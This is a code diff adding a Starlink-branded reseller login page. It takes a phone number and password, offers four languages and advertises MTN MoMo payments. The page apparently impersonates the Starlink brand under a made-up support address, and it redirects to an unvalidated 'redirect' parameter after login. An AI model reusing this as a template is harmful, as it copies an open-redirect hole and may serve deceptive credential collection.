@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Connexion - Starlink</title>
+    <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+    <link rel="manifest" href="/starlink/manifest.json">
+    <meta name="theme-color" content="#000000">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Starlink">
+    <link rel="apple-touch-icon" href="/starlink/icons/icon-192.png">
+    <script src="/starlink/pwa-install.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css">
+    <style>
+        .card-shadow { box-shadow: 0 4px 24px rgba(0,0,0,0.10); }
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #e5e7eb;
+            border-radius: 10px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+            background: #f9fafb;
+        }
+        .input-field:focus { border-color: #2563eb; background: #fff; }
+        .input-pwd { padding-right: 48px; }
+        .btn-primary {
+            width: 100%;
+            padding: 15px;
+            background: #2563eb;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: inherit;
+        }
+        .btn-primary:hover { background: #1d4ed8; }
+        .btn-primary:disabled { background: #93c5fd; cursor: not-allowed; }
+        .error-msg { display: none; background: #fef2f2; border: 1px solid #fecaca; color: #dc2626; border-radius: 8px; padding: 10px 14px; font-size: 13px; margin-bottom: 12px; }
+        .error-msg.show { display: block; }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Header -->
+    <header class="bg-black text-white shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
+            <a href="/starlink/" class="flex items-center gap-2">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="36" height="36" class="flex-shrink-0"><ellipse cx="100" cy="100" rx="74" ry="55" stroke="white" stroke-width="10" fill="none" transform="rotate(-25 100 100)"/><ellipse cx="100" cy="100" rx="43" ry="33" stroke="white" stroke-width="10" fill="none" transform="rotate(65 100 100)"/><circle cx="100" cy="100" r="12" fill="white"/></svg>
+                <span class="font-bold text-xl sm:text-2xl tracking-widest">STARLINK</span>
+                <span id="header-subtitle" class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Revendeur</span>
+            </a>
+            <div class="flex items-center gap-2 sm:gap-4">
+                <button id="langToggle" onclick="toggleLanguage()" class="flex items-center gap-1 text-xs font-semibold bg-gray-800 hover:bg-gray-700 text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-full transition">
+                    <i class="uil uil-globe"></i> <span id="langLabel">FR</span>
+                </button>
+                <nav class="flex gap-2 sm:gap-4 items-center">
+                    <a href="/starlink/status.html" class="text-gray-300 hover:text-white flex items-center gap-1 text-sm">
+                        <i class="uil uil-wifi"></i> <span id="nav-status" class="hidden sm:inline">Statut</span>
+                    </a>
+                    <a href="/starlink/" class="text-gray-300 hover:text-white flex items-center gap-1 text-sm">
+                        <i class="uil uil-shopping-bag"></i> <span id="nav-plans" class="hidden sm:inline">Forfaits</span>
+                    </a>
+                    <a href="/starlink/login.html" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-lg text-sm font-semibold transition">
+                        <span id="nav-login">Connexion</span>
+                    </a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main -->
+    <main class="min-h-screen flex items-center justify-center px-4 py-12">
+        <div class="bg-white rounded-2xl card-shadow p-8 w-full max-w-md">
+            <h1 id="form-title" class="text-2xl font-black text-gray-900 text-center mb-1">Connexion</h1>
+            <p id="form-subtitle" class="text-gray-500 text-sm text-center mb-8">Accédez à votre compte Starlink</p>
+
+            <div id="errorMsg" class="error-msg"></div>
+
+            <form id="loginForm" onsubmit="handleLogin(event)" novalidate>
+                <div class="mb-5">
+                    <label id="lbl-phone" class="block text-sm font-semibold text-gray-700 mb-2">Numéro de téléphone</label>
+                    <input type="tel" id="phone" class="input-field" placeholder="+260 97X XXX XXX" autocomplete="tel" required>
+                </div>
+                <div class="mb-6">
+                    <label id="lbl-password" class="block text-sm font-semibold text-gray-700 mb-2">Mot de passe</label>
+                    <div class="relative">
+                        <input type="password" id="password" class="input-field input-pwd" placeholder="••••••••" autocomplete="current-password" required>
+                        <button type="button" onclick="togglePwd('password', this)" title="Toggle password visibility" class="absolute right-3 text-gray-400 hover:text-gray-600" style="background:none;border:none;cursor:pointer;padding:4px;top:50%;transform:translateY(-50%)">
+                            <i class="uil uil-eye text-lg"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <button type="submit" id="submitBtn" class="btn-primary">
+                    <span id="btn-text">Se connecter</span>
+                </button>
+            </form>
+
+            <p class="text-center text-sm text-gray-500 mt-6">
+                <span id="no-account-text">Vous n'avez pas de compte ?</span>
+                <a href="/starlink/register.html" id="register-link" class="text-blue-600 font-semibold hover:underline ml-1">S'inscrire</a>
+            </p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-black text-gray-400 py-8 mt-4">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
+                <div>
+                    <h3 class="text-white font-bold mb-3">STARLINK</h3>
+                    <p class="text-sm" id="footer-desc">Authorized reseller of Starlink packages. Fast, reliable and secure payments via MTN MoMo.</p>
+                </div>
+                <div>
+                    <h3 class="text-white font-bold mb-3">SUPPORT</h3>
+                    <p class="text-sm">Email: support@starlinkzambia.reseller</p>
+                    <p class="text-sm" id="footer-support">Available 24/7 for technical support.</p>
+                </div>
+                <div>
+                    <h3 class="text-white font-bold mb-3" id="footer-payment-title">PAYMENT</h3>
+                    <p class="text-sm" id="footer-payment-desc">Pay securely with MTN MoMo. Make sure you have sufficient balance.</p>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 pt-6 text-center">
+                <p id="footer-copyright">&copy; 2026 Starlink Reseller Zambia. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // ── Redirect if already logged in ───────────────────────────────
+        (function() {
+            const redirect = new URLSearchParams(location.search).get('redirect') || '/starlink/';
+            if (localStorage.getItem('sl_auth_user')) {
+                window.location.replace(redirect);
+            }
+        })();
+
+        // ── Language ────────────────────────────────────────────────────
+        const T = {
+            fr: {
+                pageTitle: 'Connexion - Starlink', headerSubtitle: 'Revendeur',
+                navStatus: 'Statut', navPlans: 'Forfaits', navLogin: 'Connexion',
+                formTitle: 'Connexion', formSubtitle: 'Accédez à votre compte Starlink',
+                lblPhone: 'Numéro de téléphone', lblPassword: 'Mot de passe',
+                btnText: 'Se connecter', noAccount: "Vous n'avez pas de compte ?", registerLink: "S'inscrire",
+                errEmpty: 'Veuillez remplir tous les champs.', errInvalid: 'Numéro ou mot de passe incorrect.', errServer: 'Erreur serveur. Réessayez.',
+                footerDesc: 'Revendeur agréé de forfaits Starlink. Paiements rapides, fiables et sécurisés via MTN MoMo.',
+                footerSupport: 'Disponible 24/7 pour le support technique.',
+                footerPaymentTitle: 'PAIEMENT', footerPaymentDesc: "Payez en toute sécurité avec MTN MoMo. Assurez-vous d'avoir un solde suffisant.",
+                footerCopyright: '\u00a9 2026 Starlink Reseller Zambie. Tous droits réservés.'
+            },
+            en: {
+                pageTitle: 'Login - Starlink', headerSubtitle: 'Reseller',
+                navStatus: 'Status', navPlans: 'Packages', navLogin: 'Login',
+                formTitle: 'Login', formSubtitle: 'Access your Starlink account',
+                lblPhone: 'Phone number', lblPassword: 'Password',
+                btnText: 'Log in', noAccount: "Don't have an account?", registerLink: 'Sign up',
+                errEmpty: 'Please fill in all fields.', errInvalid: 'Incorrect phone or password.', errServer: 'Server error. Please try again.',
+                footerDesc: 'Authorized Starlink reseller. Fast, reliable and secure payments via MTN MoMo.',
+                footerSupport: 'Available 24/7 for technical support.',
+                footerPaymentTitle: 'PAYMENT', footerPaymentDesc: 'Pay securely with MTN MoMo. Make sure you have sufficient balance.',
+                footerCopyright: '\u00a9 2026 Starlink Reseller Zambia. All rights reserved.'
+            },
+            my: {
+                pageTitle: 'ဝင်ရောက်မည် - Starlink', headerSubtitle: 'ပြန်လည်ရောင်းချသူ',
+                navStatus: 'အခြေအနေ', navPlans: 'ပက်ကေ့ဂျ်များ', navLogin: 'ဝင်ရောက်မည်',
+                formTitle: 'ဝင်ရောက်မည်', formSubtitle: 'Starlink အကောင့်သို့ ဝင်ရောက်ပါ',
+                lblPhone: 'ဖုန်းနံပါတ်', lblPassword: 'စကားဝှက်',
+                btnText: 'ဝင်ရောက်မည်', noAccount: 'အကောင့် မရှိဘူးလား?', registerLink: 'မှတ်ပုံတင်မည်',
+                errEmpty: 'ကွက်လပ်များ ဖြည့်ပါ။', errInvalid: 'ဖုန်းနံပါတ် သို့ စကားဝှက် မှားနေသည်။', errServer: 'ဆာဗာ မှား။ ထပ်ကြိုးစားပါ။',
+                footerDesc: 'Starlink ပက်ကေ့ဂျ်များ MTN MoMo ဖြင့် ဝယ်ယူနိုင်သည်',
+                footerSupport: '24/7 နည်းပညာပံ့ပိုးမှု ရရှိနိုင်သည်',
+                footerPaymentTitle: 'ငွေပေးချေမှု', footerPaymentDesc: 'MTN MoMo ဖြင့် လုံခြုံစွာ ပေးချေနိုင်သည်',
+                footerCopyright: '\u00a9 2026 Starlink Reseller. မူပိုင်ခွင့်များ အာမခံထားသည်'
+            },
+            rn: {
+                pageTitle: 'Kwinjira - Starlink', headerSubtitle: 'Umucuruzi',
+                navStatus: 'Imimerere', navPlans: 'Amafogito', navLogin: 'Kwinjira',
+                formTitle: 'Kwinjira', formSubtitle: 'Injira mu konti yawe ya Starlink',
+                lblPhone: 'Inomero ya telefone', lblPassword: 'Ijambo ry\'ibanga',
+                btnText: 'Kwinjira', noAccount: "Nta konti mufise?", registerLink: 'Iyandikishe',
+                errEmpty: 'Uzuza imyanya yose.', errInvalid: 'Inomero cyangwa ijambo ry\'ibanga si ryo.', errServer: 'Ikosa rya seriveri. Ongera ugerageze.',
+                footerDesc: 'Umucuruzi wemewe w\'amafogito ya Starlink. Kwishura kw\'ihuta, kwemerwa kandi k\'umutekano biciye kuri MTN MoMo.',
+                footerSupport: 'Amasaha 24 kuri 24, imisi 7 kuri 7 ku bufasha bwa tekinike.',
+                footerPaymentTitle: 'KWISHURA', footerPaymentDesc: 'Ishure mu mutekano biciye kuri MTN MoMo. Murabe mufise amafaranga ahagije.',
+                footerCopyright: '\u00a9 2026 Starlink Reseller. Uburenganzira bwose burabitswe.'
+            }
+        };
+
+        let currentLang = localStorage.getItem('starlink_user_lang') || 'en';
+
+        function applyLang(lang) {
+            const t = T[lang] || T.fr;
+            currentLang = lang;
+            localStorage.setItem('starlink_user_lang', lang);
+            document.getElementById('page-title').textContent = t.pageTitle;
+            document.getElementById('header-subtitle').textContent = t.headerSubtitle;
+            document.getElementById('nav-status').textContent = t.navStatus;
+            document.getElementById('nav-plans').textContent = t.navPlans;
+            document.getElementById('nav-login').textContent = t.navLogin;
+            document.getElementById('form-title').textContent = t.formTitle;
+            document.getElementById('form-subtitle').textContent = t.formSubtitle;
+            document.getElementById('lbl-phone').textContent = t.lblPhone;
+            document.getElementById('lbl-password').textContent = t.lblPassword;
+            document.getElementById('btn-text').textContent = t.btnText;
+            document.getElementById('no-account-text').textContent = t.noAccount;
+            document.getElementById('register-link').textContent = t.registerLink;
+            document.getElementById('langLabel').textContent = lang.toUpperCase();
+            // Footer
+            document.getElementById('footer-desc').textContent = t.footerDesc;
+            document.getElementById('footer-support').textContent = t.footerSupport;
+            document.getElementById('footer-payment-title').textContent = t.footerPaymentTitle;
+            document.getElementById('footer-payment-desc').textContent = t.footerPaymentDesc;
+            document.getElementById('footer-copyright').textContent = t.footerCopyright;
+        }
+
+        function toggleLanguage() {
+            const langs = ['fr', 'en', 'my', 'rn'];
+            const next = langs[(langs.indexOf(currentLang) + 1) % langs.length];
+            applyLang(next);
+        }
+
+        function togglePwd(id, btn) {
+            const el = document.getElementById(id);
+            const isHidden = el.type === 'password';
+            el.type = isHidden ? 'text' : 'password';
+            btn.innerHTML = isHidden ? '<i class="uil uil-eye-slash text-lg"></i>' : '<i class="uil uil-eye text-lg"></i>';
+        }
+
+        function showError(msg) {
+            const el = document.getElementById('errorMsg');
+            el.textContent = msg;
+            el.classList.add('show');
+        }
+
+        function hideError() {
+            document.getElementById('errorMsg').classList.remove('show');
+        }
+
+        async function handleLogin(e) {
+            e.preventDefault();
+            hideError();
+            const t = T[currentLang] || T.fr;
+            const phone = document.getElementById('phone').value.trim();
+            const password = document.getElementById('password').value;
+
+            if (!phone || !password) { showError(t.errEmpty); return; }
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            document.getElementById('btn-text').textContent = '...';
+
+            try {
+                const res = await fetch('/api/starlink/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, password })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    localStorage.setItem('sl_auth_user', JSON.stringify({ phone: data.phone, name: data.name }));
+                    const redirect = new URLSearchParams(location.search).get('redirect') || '/starlink/';
+                    window.location.replace(redirect);
+                } else {
+                    showError(data.error || t.errInvalid);
+                    btn.disabled = false;
+                    document.getElementById('btn-text').textContent = t.btnText;
+                }
+            } catch (err) {
+                showError(t.errServer);
+                btn.disabled = false;
+                document.getElementById('btn-text').textContent = t.btnText;
+            }
+        }
+
+        // ── Country → Language map ───────────────────────────────────
+        const COUNTRY_LANG = {
+            CD:'fr',CG:'fr',GA:'fr',TD:'fr',ZM:'en',SN:'fr',CI:'fr',BJ:'fr',
+            ML:'fr',BF:'fr',NE:'fr',TG:'fr',GN:'fr',MG:'fr',DJ:'fr',KM:'fr',
+            CF:'fr',GQ:'fr',RW:'fr',
+            BI:'rn',
+            MM:'my',
+            KE:'en',TZ:'en',UG:'en',ZM:'en',SL:'en',GH:'en',NG:'en',
+            ET:'en',ZW:'en',MW:'en',MZ:'en',AO:'en'
+        };
+
+        async function detectLang() {
+            return 'fr';
+        }
+
+        detectLang().then(lang => applyLang(lang));
+    </script>
+</body>
+</html>
